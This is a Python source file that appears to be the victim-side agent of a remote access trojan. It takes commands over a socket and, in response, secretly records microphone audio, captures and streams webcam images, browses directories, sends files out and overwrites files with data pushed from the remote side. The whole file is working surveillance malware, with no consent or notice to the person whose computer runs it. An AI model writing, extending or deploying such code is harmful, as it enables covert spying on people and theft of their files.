import socket
import pyaudio
import cv2
from json import dumps,loads
from numpy import array
from time import sleep
from os import listdir,chdir,path
def recSound(conn):
    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 2
    fs = 44100
    seconds = int(conn.recv(1024).decode()) # Get time to record
    p = pyaudio.PyAudio()  
    stream = p.open(format=sample_format,channels=channels,rate=fs,frames_per_buffer=chunk,input=True)
    frames = []  
    for i in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    conn.send(str(p.get_sample_size(sample_format)).encode())
    sleep(0.25)
    for itm in frames:
        conn.send(itm)
    '''
    server : send secs
    This file : send get_sample_size
    This file : send sample_format
    '''
def live(conn):
    vid = cv2.VideoCapture(0)
    while 1:
        ret, frame = vid.read()
        RGBlist=frame.tolist()
        dmps=dumps(RGBlist)
        conn.sendall(dmps.encode())
        conn.send("END".encode())
        flag=conn.recv(1024).decode()
        if flag=='end':
            break
        sleep(0.25)
def getPic(conn):
    vid = cv2.VideoCapture(0)
    ret, frame = vid.read()
    RGBlist=frame.tolist()
    dmps=dumps(RGBlist)
    conn.send(dmps.encode())
def DirExp(conn,command):
    if command[0:6]=='FXshf:':
        fds=''
        srhFile=command.split(":")[1]
        for fd in listdir():
            if srhFile in fd:
                if path.isdir(fd):
                    fds+="D:"
                else :
                    fds+="F:"
                fds+=fd+"\n"
        sleep(0.5)
        conn.send(fds.encode())
    elif command[0:6] =='FXchd:':
        newPath=command.split(":")[1]
        try:
            chdir(newPath)
            sleep(0.5)
            conn.send(" Done !".encode())
        except FileNotFoundError :
            sleep(0.5)
            conn.send("The path entered is incorrect !".encode())
    elif command[0:6]=='FXdwn:' or  command[0:7]=='4FXdwn:':
        filePath=command.split(":")[1]
        buffer=4096
        try:
            if path.isfile(filePath):
                filesize=path.getsize(filePath)
                if  command[0:6]=='FXdwn:':
                    conn.send(str(filesize).encode())
                with open(filePath,"rb") as BFile:
                    while 1:
                        rdata=BFile.read(buffer)
                        if not rdata:
                            break
                        conn.sendall(rdata)
                if command[0:7]=='4FXdwn:':
                    buffer = 4096
                    with open(filePath ,"wb") as f:
                        while 1:
                            data=conn.recv(buffer)
                            if "END" in str(data[len(data)-3:]) :
                                data=data[0:(len(data)-3)]
                                f.write(data)    
                                break
                            if not data :
                                break
                            f.write(data)
                        f.close()
            else :
                return 1
        except FileNotFoundError:
            conn.send("The path entered is incorrect !".encode())
            return 1
def commandRunner(conn,command,key):
    while 1:
        sleep(0.25)
        if command=="Tpict":
            getPic(conn)
            conn.send(b"END")
            break
        elif command=="Rsound":
            recSound(conn)
            conn.send(b"END")
            break
        elif command=="Glive":
            live(conn)
            conn.send(b"END")
            break
        elif command[0:2]=="FX" or command[0:3]=="4FX":
            DirExp(conn,command)
            conn.send(b"END")
            break
        else :
            break